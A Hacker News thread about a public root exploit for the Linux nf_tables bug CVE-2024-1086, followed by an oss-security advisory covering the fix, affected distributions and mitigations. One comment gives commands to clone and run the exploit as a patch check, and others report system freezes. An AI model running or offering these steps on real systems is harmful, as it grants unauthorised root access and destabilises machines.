ago](item?id=39834825)   | [root](#39829396) | [parent](#39833687) | [next](#39830942) [–]  If you're able to throw a 0day at a target, there's nothing stopping you from throwing it again after they reinstall. | | --- | --- | --- | | | |  |  | [frankjr](user?id=frankjr) [9 months ago](item?id=39830942)   | [root](#39829396) | [parent](#39829590) | [prev](#39830690) | [next](#39829430) [–]  Is there a reason why user namespaces cannot be enabled per executable? setcap "something something user ns" /usr/bin/chrome? | | --- | --- | --- | | | |  |  | [kentonv](user?id=kentonv) [9 months ago](item?id=39831850)   | [root](#39829396) | [parent](#39830942) | [next](#39829430) [–]  In theory that might work. In practice, it doesn't help much; you might as well stick with setuid-root. \* The mechanism for granting capabilities to binaries is convoluted, requiring special tools, filesystem support, and fiddly code. It's surprisingly tedious to make it work. \* There's no specific capability for user namespaces. When they require privileges at all, they require CAP\_SYS\_ADMIN. This capability is basically equivalent to root anyway. In fact, many Linux capabilities can easily be escalated to full root privileges. My personal opinion is that Linux "capabilities" are not worth using most of the time. (I also hate that they are called "capabilities", a word that I would rather reserve for object-capabilities, which are an actually-useful security model!) | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [9 months ago](item?id=39829430)   | [parent](#39829396) | [prev](#39829590) | [next](#39829453) [–]  Because if they didn't keep having bugs like this, they'd be a great security feature. Like, it'd be great if running flatpaks didn't require a suid binary on the host in order to isolate apps. | | --- | --- | --- | | | |  |  | [\_factor](user?id=_factor) [9 months ago](item?id=39829453)   | [parent](#39829396) | [prev](#39829430) | [next](#39829290) [–]  The issue is the “just works” philosophy. Most defaults are insecure and require technical expertise and hardening. | | --- | --- | --- | | | |  |  | [okl](user?id=okl) [9 months ago](item?id=39829290)   | [prev](#39829396) | [next](#39829932) [–]  Commit which introduced the problem: [https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/lin...](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e0abdadcc6e1) The nested switch/case with return in the default path, then expecting fall-through, looks bogus to me. | | --- | --- | --- | | | |  |  | [rightbyte](user?id=rightbyte) [9 months ago](item?id=39830027)   | [parent](#39829290) | [next](#39830092) [–]  Same guy? <https://lwn.net/Articles/882397/> | | --- | --- | --- | | | |  |  | [pphysch](user?id=pphysch) [9 months ago](item?id=39830717)   | [root](#39829290) | [parent](#39830027) | [next](#39830092) [–]  > I would encourage you to read up on details of McHardy’s practices. They were clearly not done in good faith and there was no attempt to encourage compliance. The only goal was to extract as much money as possible even if the violations were more technical or incidental in nature and the companies willing to attempt remedy. Even minor and unintentional violations were pursued zealously without interest in remedy - just cash. > My understanding is he also didn’t truly prioritize deep pocketed violators (no suit against VMWare, afaik) - he prioritized that delicious sweet spot of “deep enough to pay me off, but too small to make it realistic to fight me in court”. And, again, he was uninterested in remediation of even minor and unintentional violations - he wanted cash. It seems unlikely this was helping the cause of free software. Seems entirely possible that such a character would knowingly insert a backdoor to sell as a 0-day. | | --- | --- | --- | | | |  |  | [spr-alex](user?id=spr-alex) [9 months ago](item?id=39831175)   | [root](#39829290) | [parent](#39830717) | [next](#39830092) [–]  this code was written before unprivileged network namespaces were much of a thing so the theory that a developer would plant a bugdoor for this is not probable. you can think of unprivileged namespaces in general as a bunch of attack surface that was previously root to kernel only and hadn't had much scrutiny. these bugs will take decades to eliminate without a rewrite of linux. | | --- | --- | --- | | | |  |  | [MuffinFlavored](user?id=MuffinFlavored) [9 months ago](item?id=39830092)   | [parent](#39829290) | [prev](#39830027) | [next](#39829932) [–]  Your link converted to GitHub: [https://github.com/torvalds/linux/commit/f342de4e2f33e0e3916...](https://github.com/torvalds/linux/commit/f342de4e2f33e0e39165d8639387aa6c19dff660) <https://bugs.launchpad.net/bugs/cve/2024-1086> > A use-after-free vulnerability in the Linux kernel's netfilter: nf\_tables component can be exploited to achieve local privilege escalation. The nft\_verdict\_init() function allows positive values as drop error within the hook verdict, and hence the nf\_hook\_slow() function can cause a double free vulnerability when NF\_DROP is issued with a drop error which resembles NF\_ACCEPT. We recommend upgrading past commit f342de4e2f33e0e39165d8639387aa6c19dff660. | | --- | --- | --- | | | |  |  | [andy\_xor\_andrew](user?id=andy_xor_andrew) [9 months ago](item?id=39829932)   | [prev](#39829290) | [next](#39829540) [–]  I have some questions for you wizard shellcode-flinging hackers out there. with modern mitigations like ASLR and beyond, how are exploits like this even possible? I took a course in college which provided us with a dozen binaries, to be run on a specific Ubuntu version. Each binary had a different bug, use-after-free, buffer overflow, both, or more, and our task was to exploit it.[0] It was HARD. Finding the flaw was hard. Then, writing the exact correct shellcode to do something useful with the flaw was even harder. Especially when you only have the compiled binary and GDB to work with. In harder levels, we had to do this with mitigations enabled like ASLR, stack canaries, etc. And my takeaway was, this is nearly impossible, because you need to 1. discover an exploitable flaw (or multiple, and chain them together!!) 2. find the exact binary shellcode payload that will do something useful without simply crashing the executable. And this was in a controlled environment as students, not the real world which is even more difficult. So my question is, with all these mitigations, how is it possible?! [0] I googled for the exact project but could not find it, though it was very very similar to this: [https://web.stanford.edu/class/archive/cs/cs107/cs107.1194/a...](https://web.stanford.edu/class/archive/cs/cs107/cs107.1194/assign6/) | | --- | --- | --- | | | |  |  | [Veserv](user?id=Veserv) [9 months ago](item?id=39830567)   | [parent](#39829932) | [next](#39830109) [–]  You were a inexperienced beginner finding and exploiting tens of bugs over a 10-15 week course. In between other courses and learning you only had hours to maybe a few days per bug. On Zerodium [1], a generic Linux LPE pays 50 K$. At normal experienced exploit developer costs that buys you ~200 person-hours. That is professionals spending 10-100x as much time as you spent. Just think of the gap between the first time in the woodworking shop and a carpenter, first time pottery versus a master, a new painter and a professional artist. Think of how many things the master can do that it is literally impossible for the new person to do. Then add another 10-100x as much time on that. That is the gap. [1] <https://zerodium.com/program.html> | | --- | --- | --- | | | |  |  | [rfoo](user?id=rfoo) [9 months ago](item?id=39831365)   | [root](#39829932) | [parent](#39830567) | [next](#39834857) [–]  It makes your point even stronger, but > a generic Linux LPE pays 50 K$. At normal experienced exploit developer costs that buys you ~200 person-hours. $250 per hour? I must be living in the wrong part of the world then, where can find an exploit developer job like this :o | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39831739)   | [root](#39829932) | [parent](#39831365) | [next](#39831923) [–]  I don't work in that space, so i don't know what is normal, but that sounds reasonable to me. Its a niche field that requires quite a bit of low level skill. I'd expect it to pay significantly more than web dev jobs | | --- | --- | --- | | | |  |  | [buggeryorkshire](user?id=buggeryorkshire) [9 months ago](item?id=39836778)   | [root](#39829932) | [parent](#39831739) | [next](#39831923) [–]  They pay more than that in certain parts of the UK and US - didn't do it myself, but know people who did and they were definitely in demand. | | --- | --- | --- | | | |  |  | [Veserv](user?id=Veserv) [9 months ago](item?id=39831923)   | [root](#39829932) | [parent](#39831365) | [prev](#39831739) | [next](#39834857) [–]  Costs, not salary. Overhead is usually 1.5x-3x salary and I was throwing in some profit for good measure. So the number I threw out is more in the 150 k$-300 k$ range, not the 500 k$ range like you are thinking. | | --- | --- | --- | | | |  |  | [Manouchehri](user?id=Manouchehri) [9 months ago](item?id=39834857)   | [root](#39829932) | [parent](#39830567) | [prev](#39831365) | [next](#39830109) [–]  I went from having previously written 0 exploits (aside from IoT fails with command injection), to my first Chrome exploit in about 15 weeks. I did probably put in about 1,000 hours though. | | --- | --- | --- | | | |  |  | [jimmyl02](user?id=jimmyl02) [9 months ago](item?id=39830109)   | [parent](#39829932) | [prev](#39830567) | [next](#39830091) [–]  modern mitigations have made exploits much more difficult, however researchers continue to find bypasses to these mitigations. there are "classic" techniques to bypass most of the modern protections and if there isn't then researchers often come up with novel attacks / bypasses. for example for heap protections you can see how2heap to bypass heap protections[0]. another example is an exploit which allows bypass of KASLR (which has since been patched)[1]. it looks like this exploit comes up with a "dirty pagetable" technique[2]. it's always a game of cat and mouse with more mitigations always being added while researchers constantly look to bypass them. [0] <https://github.com/shellphish/how2heap> [1] <https://www.willsroot.io/2022/12/entrybleed.html> [2] <https://pwning.tech/nftables/#452-the-technique> | | --- | --- | --- | | | |  |  | [freedomben](user?id=freedomben) [9 months ago](item?id=39830091)   | [parent](#39829932) | [prev](#39830109) | [next](#39833294) [–]  short answer: some people are good, some people are lucky, and some people are good *and* lucky. It only takes one from the latter category to find these things longer answer: It is definitely really damn hard these days. Even disabling the mitigations, it's still pretty hard to find and a vuln and write an exploit. But many people who find these (not all though) work as part of a team, where they can parallelize fuzzing efforts and combine/chain knowledge and other exploits much better than an individual could. The level of expertise and talent that some of these people have is absolutely incredible, and experience is worth a pound of gold for these types of things, and some people have years or decades of experience. | | --- | --- | --- | | | |  |  | [robotnikman](user?id=robotnikman) [9 months ago](item?id=39833294)   | [parent](#39829932) | [prev](#39830091) | [next](#39830004) [–]  I've wondered this myself. I've tried a class similar to yours, where you were provided with binaries and tried to find the bugs in them. And it was hard. But when you consider that major bugs found now are being found by well funded teams or state actors trying to exploit them, it makes more sense that they would be able to work around existing mitigations due to the sheer manpower and resources they have to throw at the problem. | | --- | --- | --- | | | |  |  | [4gotunameagain](user?id=4gotunameagain) [9 months ago](item?id=39830004)   | [parent](#39829932) | [prev](#39833294) | [next](#39829540) [–]  There's an entire section about KASLR in the blogpost linked on the repository. | | --- | --- | --- | | | |  |  | [wiredfool](user?id=wiredfool) [9 months ago](item?id=39829540)   | [prev](#39829932) | [next](#39829739) [–]  According to ubuntu -- It hits all LTS releases, and is fixed in current patched kernels: (<https://ubuntu.com/security/CVE-2024-1086>) ```   * Focal: 5.4.0-174.193   * Jammy: 5.15.0-101.111   * Mantic: 6.5.0-26.26  ``` As well as Xenial and Bionic for those of you with extended support | | --- | --- | --- | | | |  |  | [bhaney](user?id=bhaney) [9 months ago](item?id=39829739)   | [prev](#39829540) | [next](#39829296) [–]  Tried running it on a vulnerable Debian system of mine. Didn't privesc, but did lock up the entire system on the second run (first run just failed entirely). So still definitely worth taking the time to patch. | | --- | --- | --- | | | |  |  | [cschmid](user?id=cschmid) [9 months ago](item?id=39829296)   | [prev](#39829739) | [next](#39955108) [–]  For anyone who's wondering, you can see your current kernel config in a file like /boot/config or /proc/config.gz | | --- | --- | --- | | | |  |  | [wcl\_](user?id=wcl_) [9 months ago](item?id=39955108)   | [prev](#39829296) | [next](#39829597) [–]  Running on a VM on Debian 12 with 6.1 kernel. Got this: "failed to detect overwritten pte: is more PTE spray needed? pmd: 00000000cafebabe" | | --- | --- | --- | | | |  |  | [whoopdedo](user?id=whoopdedo) [9 months ago](item?id=39829597)   | [prev](#39955108) | [next](#39830975) [–]  Does this still work if you have user namespace covered by AppArmor? [https://discourse.ubuntu.com/t/spec-unprivileged-user-namesp...](https://discourse.ubuntu.com/t/spec-unprivileged-user-namespace-restrictions-via-apparmor-in-ubuntu-23-10/37626) | | --- | --- | --- | | | |  |  | [jcalvinowens](user?id=jcalvinowens) [9 months ago](item?id=39830975)   | [prev](#39829597) | [next](#39845272) [–]  Distros don't build with it, but CONFIG\_INIT\_ON\_FREE\_DEFAULT\_ON prevents the exploit. I think it's a nice demonstration of the value of the hardening in the kernel. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39836591)   | [parent](#39830975) | [next](#39845272) [–]  this zeroes memory on every allocation and deallocation. huge perf hit | | --- | --- | --- | | | |  |  | [jcalvinowens](user?id=jcalvinowens) [9 months ago](item?id=39841669)   | [root](#39830975) | [parent](#39836591) | [next](#39845272) [–]  Zeroing on allocation is almost free. You can invent microbenchmarks where it hurts, but for most workloads it doesn't matter. You can also invent micro cases where it is *beneficial*, because the cache is hot after the zeroing. The always kernel zeros all userspace allocations, and always has. In a former life, I actually tested this on an x86 webserver workload: the overhead of zeroing on allocation on CPUs that were Ivy Bridge or newer was so small it was literally impossible to measure in high-level web metrics. Sandy Bridge took a 1-2% hit in request throughput as I recall. Zeroing on free is a different story though, that trashes the cache. | | --- | --- | --- | | | |  |  | [anonbanker](user?id=anonbanker) [9 months ago](item?id=39845272)   | [prev](#39830975) | [next](#39832193) [–]  I had been experiencing this vulnerability, as well as the Dirty Pagetable vuln, for the last six months. It's gotten to the point where I've disabled user and network namespaces entirely. Long story short: it's very advantageous for an unscrupulous kernel developer to take advantage of embargoes for 0-days on targets he does not like. | | --- | --- | --- | | | |  |  | [FergusArgyll](user?id=FergusArgyll) [9 months ago](item?id=39832193)   | [prev](#39845272) | [next](#39839003) [–]  I just tried this on WSL Ubuntu (after an apt update && upgrade), Completely freaked my computer out, I almost thought I bricked it but a restart worked. I'm not smart enough to understand it but someone may want to look into it | | --- | --- | --- | | | |  |  | [XCSme](user?id=XCSme) [9 months ago](item?id=39839003)   | [prev](#39832193) | [next](#39832675) [–]  Wow, this is what it takes to find such a vulnerability? Even the initial diagram seems so complex. I wonder if AI can be used to test/find such complex exploits. | | --- | --- | --- | | | |  |  | [jijijijij](user?id=jijijijij) [9 months ago](item?id=39840115)   | [parent](#39839003) | [next](#39832675) [–]  > I wonder if AI can be used to test/find such complex exploits. [https://daniel.haxx.se/blog/2024/01/02/the-i-in-llm-stands-f...](https://daniel.haxx.se/blog/2024/01/02/the-i-in-llm-stands-for-intelligence/) | | --- | --- | --- | | | |  |  | [mise\_en\_place](user?id=mise_en_place) [9 months ago](item?id=39832675)   | [prev](#39839003) | [next](#39829331) [–]  Oof, double free is one of those notorious bugs. And to think it comes from something as innocuous as netfilter rules. | | --- | --- | --- | | | |  |  | [rakejake](user?id=rakejake) [9 months ago](item?id=39829331)   | [prev](#39832675) | [next](#39829916) [–]  Running Ubuntu with Kernel 6.5.0-26 Got this? failed to detect overwritten pte: is more PTE spray needed? pmd: 00000000cafebabe | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39829512)   | [parent](#39829331) | [next](#39829916) [–]  This is indeed expected. I specified in the "Caveats" section in README.md that the exploit does not work on Ubuntu v6.5 (because it enables a certain kernel config value that indirectly mitigates the exploit starting from v6.4), and may not work on other kernels above v6.4 depending on the config. | | --- | --- | --- | | | |  |  | [rakejake](user?id=rakejake) [9 months ago](item?id=39829910)   | [root](#39829331) | [parent](#39829512) | [next](#39829916) [–]  Ah I read that versions upto v6.6 were affected and didn't notice the caveats. Thanks | | --- | --- | --- | | | |  |  | [pqdbr](user?id=pqdbr) [9 months ago](item?id=39829916)   | [prev](#39829331) | [next](#39830200) [–]  How do I check if my Ubuntu kernel has already been patched? And if it hasn’t, any tips on how to upgrade? | | --- | --- | --- | | | |  |  | [wiredfool](user?id=wiredfool) [9 months ago](item?id=39830648)   | [parent](#39829916) | [next](#39830098) [–]  <https://ubuntu.com/security/CVE-2024-1086> There's a super long list there, but most everything has been updated or superceded. The standard (updated) kernels are: ```   * Focal: 5.4.0-174.193   * Jammy: 5.15.0-101.111   * Mantic: 6.5.0-26.26   ``` And if you haven't updated, apt-get update && apt-get dist-upgrade. | | --- | --- | --- | | | |  |  | [RVRX](user?id=RVRX) [9 months ago](item?id=39850224)   | [root](#39829916) | [parent](#39830648) | [next](#39830098) [–]  Can you help me with reading that page? What's the difference between the `linux-kvm` vs `linux-hwe-6.5`? They both list different release fixes for Jammy, 5.15.0-101.111 and 6.5.0-26.26 respectively. Edit: Oh it looks like the generic kernel is the one named just "linux" and also has 5.15.0... as the patched version on Jammy | | --- | --- | --- | | | |  |  | [wiredfool](user?id=wiredfool) [9 months ago](item?id=39903707)   | [root](#39829916) | [parent](#39850224) | [next](#39830098) [–]  FWIW, hwe is hardware enablement, so bleeding edge kernel on older distro. KVM is specifically focused on KVM virtual machines. | | --- | --- | --- | | | |  |  | [popol12](user?id=popol12) [9 months ago](item?id=39830098)   | [parent](#39829916) | [prev](#39830648) | [next](#39830200) [–]  sudo apt-get install musl-tools git clone <https://github.com/Notselwyn/CVE-2024-1086> cd CVE-2024-1086 /*disable your wifi (the author says it's increasing chances of the exploit working)*/ ./exploit If it runs till the end, then you should update your kernel | | --- | --- | --- | | | |  |  | [caseyf](user?id=caseyf) [9 months ago](item?id=39831868)   | [root](#39829916) | [parent](#39830098) | [next](#39830200) [–]  little warning for others - i tested it on a jammy box with kernel.unprivileged\_userns\_clone = 0 and it froze up good | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39830200)   | [prev](#39829916) | [next](#39829308) [–]  Url changed from <https://github.com/Notselwyn/CVE-2024-1086>, which points to this. | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39831847)   | [parent](#39830200) | [next](#39829308) [–]  Is there a reason why you did this? I knowingly chose the other title because it would apply more to the Hackernews audience to raise more awareness of the exploit and that people should update. This title was aimed at the Linux kernel VR community, which also shows because the post instantly dropped down from a 2-hour #1 position to #8 | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39831992)   | [root](#39830200) | [parent](#39831847) | [next](#39829308) [–]  The title generated complaints: <https://news.ycombinator.com/item?id=39829308>. In such cases we usually change the title (experience has shown this to be the best way to turn discussion away from title complaints to whatever the more interesting topic is). In doing that, I noticed that the blog post includes a lot more background than the github link, so I switched the URL as well. | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [9 months ago](item?id=39829308)   | [prev](#39830200) | [next](#39828997) [–]  I think it's misleading to label this "Debian/Ubuntu privilege escalation"; it's a Linux kernel local exploit, that *happens* to be confirmed to apply to Debian and Ubuntu. (Edit: Because when I read "Debian/Ubuntu privilege escalation PoC exploit for CVE-2024-1086" my first thought was something like, "Oh, is it in apt-get? Or is this another distro patch gone wrong?") | | --- | --- | --- | | | |  |  | [freedomben](user?id=freedomben) [9 months ago](item?id=39829936)   | [parent](#39829308) | [next](#39829613) [–]  You're not necessarily wrong, although simply saying "Linux" isn't accurate either because it's in part a vuln exposed by a specific kconfig, which differs by distro. From the caveats section: > The exploit does not work v6.4> kernels with kconfig CONFIG\_INIT\_ON\_ALLOC\_DEFAULT\_ON=y (including Ubuntu v6.5) > The exploits requires user namespaces (kconfig CONFIG\_USER\_NS=y), that those user namespaces are unprivileged (sh command sysctl kernel.unprivileged\_userns\_clone = 1), and that nf\_tables is enabled (kconfig CONFIG\_NF\_TABLES=y). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well. Also with other distros like Fedora and Arch, the kernel versions change frequently including new big versions (like 6.4 to 6.5, what in semver would be called "minor" but isn't super accurate for the linux kernel) so that list would be outdated very quickly if not immediately (for example my Fedora machine right now is on kernel 6.7.9, way beyond what is vulnerable). It's quite possible that Ubuntu *is* the only vulnerable distro given the way they manage kernel versions. That's not a criticism of Ubuntu, because there are pros and cons of each approach, but in *this* case it does probably make Ubuntu more vulnerable. RHEL and derivatives also tend to stick on a version long term, and it looks like RHEL 9.3 is on kernel 5.14 so *could* be vulnerable but it's at the very beginning of the range. That would be a useful thing to know. I think it's also (generally) far more useful for most people to hear a descriptor that most closely aligns with something they can readily identify whether it affects them or not. Then people can look at the details themselves. Edit: added a little more on other distros like Fedora and Arch | | --- | --- | --- | | | |  |  | [candiddevmike](user?id=candiddevmike) [9 months ago](item?id=39830073)   | [root](#39829308) | [parent](#39829936) | [next](#39830594) [–]  Interesting Arch discussion on the security implications of user namespaces when they were considering adding it to their kconfig: <https://bugs.archlinux.org/task/36969> | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [9 months ago](item?id=39830594)   | [root](#39829308) | [parent](#39829936) | [prev](#39830073) | [next](#39829613) [–]  > simply saying "Linux" isn't accurate either because it's in part a vuln exposed by a specific kconfig, which differs by distro True; if the Debian family is unusual in having that config then fair enough, but it sounds like the author just didn't look at others. > Also with other distros like Fedora and Arch, the kernel versions change frequently including new big versions (like 6.4 to 6.5, what in semver would be called "minor" but isn't super accurate for the linux kernel) so that list would be outdated very quickly if not immediately Debian/Ubuntu still roll patch releases regularly, so that seems irrelevant; it'll be out of date in short order regardless. | | --- | --- | --- | | | |  |  | [wiredfool](user?id=wiredfool) [9 months ago](item?id=39829613)   | [parent](#39829308) | [prev](#39829936) | [next](#39830215) [–]  Also, it's already been patched and the vulnerable are the ones who haven't updated. | | --- | --- | --- | | | |  |  | [pajko](user?id=pajko) [9 months ago](item?id=39829989)   | [root](#39829308) | [parent](#39829613) | [next](#39829782) [–]  The world was given a pretty short time frame to adapt. Now the script kiddies will unleash the hell. | | --- | --- | --- | | | |  |  | [eikenberry](user?id=eikenberry) [9 months ago](item?id=39830896)   | [root](#39829308) | [parent](#39829989) | [next](#39829782) [–]  It was patched a month and a half ago which means it was known about before that. So around 30ish days known until the CVE and 60 until this published exploit. IMO this is a decent time frame, how long do you think is enough? | | --- | --- | --- | | | |  |  | [krylon](user?id=krylon) [9 months ago](item?id=39829782)   | [root](#39829308) | [parent](#39829613) | [prev](#39829989) | [next](#39830215) [–]  Thanks for pointing that out, I was confused about that. | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39830215)   | [parent](#39829308) | [prev](#39829613) | [next](#39829469) [–]  We've changed the title from "Debian/Ubuntu privilege escalation PoC exploit for CVE-2024-1086" as part of changing the URL (see <https://news.ycombinator.com/item?id=39830200>) | | --- | --- | --- | | | |  |  | [KennyBlanken](user?id=KennyBlanken) [9 months ago](item?id=39829469)   | [parent](#39829308) | [prev](#39830215) | [next](#39828997) [4 more]  [flagged] | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39832006)   | [root](#39829308) | [parent](#39829469) | [next](#39829525) [–]  If you keep posting personal attacks, we're going to have to ban you. I don't want to ban you—you're a knowledgeable user who has posted good things. But we've warned you a whole bunch of times already, the slack can't be infinite, and no amount of good comments makes it ok to repeatedly poison the well. <https://news.ycombinator.com/item?id=39111764> (Jan 2024) <https://news.ycombinator.com/item?id=35416693> (April 2023) <https://news.ycombinator.com/item?id=34606566> (Feb 2023) <https://news.ycombinator.com/item?id=33292588> (Oct 2022) <https://news.ycombinator.com/item?id=32729960> (Sept 2022) <https://news.ycombinator.com/item?id=32729939> (Sept 2022) <https://news.ycombinator.com/item?id=31842940> (June 2022) <https://news.ycombinator.com/item?id=30436952> (Feb 2022) <https://news.ycombinator.com/item?id=30433141> (Feb 2022) <https://news.ycombinator.com/item?id=28948931> (Oct 2021) If you'd please review <https://news.ycombinator.com/newsguidelines.html> and stick to the rules when posting here, we'd appreciate it. | | --- | --- | --- | | | |  |  | [jvanderbot](user?id=jvanderbot) [9 months ago](item?id=39829525)   | [root](#39829308) | [parent](#39829469) | [prev](#39832006) | [next](#39828997) [–]  > Don't criticize a title based on a barely-15-seconds-examination of something. Suggest removing this, it's overly-reproachful and GP comment be explained by being less knowledgeable, busy, under-caffeinated, etc. Your comment is highly informative for those who had similar thoughts - no reason to make it negative in nature. | | --- | --- | --- | | | |  |  | [KennyBlanken](user?id=KennyBlanken) [9 months ago](item?id=39829811)   | [root](#39829308) | [parent](#39829525) | [next](#39828997) [2 more]  [flagged] | | --- | --- | --- | | | |  |  | [jvanderbot](user?id=jvanderbot) [9 months ago](item?id=39829845)   | [root](#39829308) | [parent](#39829811) | [next](#39828997) [–]  You are free to attempt to enforce a price-of-admission to comment. I attempt to use the up/down vote to filter rather than reproach. I feel it's more in the spirit of HN. I appreciate you providing context to your thought process, and I am only doing so similarly for transparency. I think we can politely disagree about approach and go on our way now. Have a good day! | | --- | --- | --- | | | |  |  | [mtlynch](user?id=mtlynch) [9 months ago](item?id=39828997)   | [prev](#39829308) | [next](#39829160) [–]  It looks like this repo is redistributing source from third-party libraries without required license notices.[0] You should put the license notices at the root of your ./include directories to respect the work of the libraries you're using. [0] <https://github.com/Notselwyn/CVE-2024-1086/issues/1> | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39829074)   | [parent](#39828997) | [next](#39829160) [–]  Thanks for the notice. I will immediately fix it. | | --- | --- | --- | | | |  |  | [JonChesterfield](user?id=JonChesterfield) [9 months ago](item?id=39829160)   | [prev](#39828997) | [next](#39828966) [–]  Summary is netfilter has a use-after-free bug and that's sufficient to go from a normal shell to root. Bad times, nice demo | | --- | --- | --- | | | |  |  | [amne](user?id=amne) [9 months ago](item?id=39828966)   | [prev](#39829160) [–]  Dodged it! 5.10.184-175.749.amzn2.x86\_64 #1 SMP | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from www.openwall.com_7146396f_20250111_070330.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](21) [[next>]](23) [[thread-next>]](23) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240410225113.GA21187@openwall.com>
Date: Thu, 11 Apr 2024 00:51:13 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: CVE-2024-1086: Linux: nf_tables: use-after-free vulnerability in the nft_verdict_init() function

Hi,

Quoting the CVE description:

A use-after-free vulnerability in the Linux kernel's netfilter:
nf_tables component can be exploited to achieve local privilege
escalation. The nft_verdict_init() function allows positive values as
drop error within the hook verdict, and hence the nf_hook_slow()
function can cause a double free vulnerability when NF_DROP is issued
with a drop error which resembles NF_ACCEPT.

Introduced in February 2014:
<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e0abdadcc6e1>

Fixed in January 2024:
<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f342de4e2f33e0e39165d8639387aa6c19dff660>

This is old news, but it's still relevant.  Out of major distros,
notably RHEL 9.3 (and most rebuilds) is still not fixed, and Notselwyn's
exploit that just works all the way to a root shell was recently widely
publicized:

<https://github.com/Notselwyn/CVE-2024-1086>

There are known mitigations: blacklist the nf_tables kernel module if
unused, disallow access to user namespaces if containers are not used,
load Jonathan Wright's unofficial AlmaLinux kpatch (link below), or/and
load LKRG (kills the published exploit at its last stage, leaving the
system unstable).

<https://jonathanspw.com/posts/2024-03-31-dealing-with-cve-2024-1086/>

$ sha256sum AlmaLinux-9--5-14-0-362--CVE-2024-1086-Patch.ko
446a2f0a78f92a5530c45d443680171536888c4e6f6a3edaff95a412ca1aafbe  AlmaLinux-9--5-14-0-362--CVE-2024-1086-Patch.ko

The above exploit's author Notselwyn also wrote an extensive blog post
on March 26:

<https://pwning.tech/nftables/>

Its title and abstract are:

"Flipping Pages: An analysis of a new Linux vulnerability in nf_tables
and hardened exploitation techniques

A tale about exploiting KernelCTF Mitigation, Debian, and Ubuntu
instances with a double-free in nf_tables in the Linux kernel, using
novel techniques like Dirty Pagedirectory. All without even having to
recompile the exploit for different kernel targets once."

I asked and was hoping Notselwyn would bring this to oss-security
directly, but since that's not happening I am posting this relatively
brief message now.  I understand it'd be a lot of work to process the
whole blog post into a plain text message.

Another reason for me to post this is that a somewhat obscure public
GitHub repo link (0 forks, 0 stars) for a different reproducer (crashing
the kernel) for what turned out to be the same bug was brought to
linux-distros (and wrongly also to distros) on March 29 (asking for a
CVE assignment).  By linux-distros policy we need to have the underlying
vulnerability, once it's public, brought up on oss-security.

As the reporter wouldn't communicate with linux-distros any further, we
ended up directly bringing this to s@k.o and found out the reporter did
also bring the issue to there.  What happened next highlighted what may
be a gap in report handling by s@....  Due to the reproducer being on a
public GitHub repo, s@k.o merely redirected the reporter to take it to
the normal developer mailing lists.  Which the reporter neglected to do.
When a "public" issue enters this state, it's apparently not tracked by
s@k.o anymore.  So if it were not for linux-distros, I think the report
would just fall through the cracks and remain uninvestigated.  Which
means if the bug were not already fixed, it'd remain unfixed until maybe
rediscovered.  Via linux-distros, we pinged s@k.o further, and Greg got
the Netfilter maintainers involved, who determined it's the fixed bug
above.  Luckily, this did not matter (the bug is already known and fixed
anyway), but for some other bug it could.

Incidentally, that reporter in question is the same person accused of
exploit plagiarism in the other Linux kernel oss-security posting today.
So you can find their reproducer by following links from there to their
other repo.  I don't want to directly promote it here (no need given the
real exploit is so public, plus s@k.o previously expressed they dislike
publication of reproducers), but perhaps it's somewhat more visible now.
